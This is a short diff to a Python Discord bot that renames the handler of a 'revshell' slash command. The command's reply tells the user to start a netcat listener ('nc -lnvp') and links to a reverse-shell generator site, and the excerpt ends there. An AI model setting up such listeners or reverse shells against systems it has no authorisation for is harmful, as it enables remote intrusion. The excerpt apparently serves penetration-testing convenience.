@@ -20,7 +20,7 @@ async def ping(interaction):
     await interaction.response.send_message(f'Pong: {round(client.latency, 3)}ms', ephemeral=True)
 
 @tree.command(name="revshell", description="Get a reverse shell", guilds=servers)
-async def modulus(interaction, ip_address: str, port: int):
+async def revshell(interaction, ip_address: str, port: int):
     await interaction.response.send_message(f"""
                                             Don't forget ```bash\nnc -lnvp {port}\n```
                                             https://www.revshells.com/
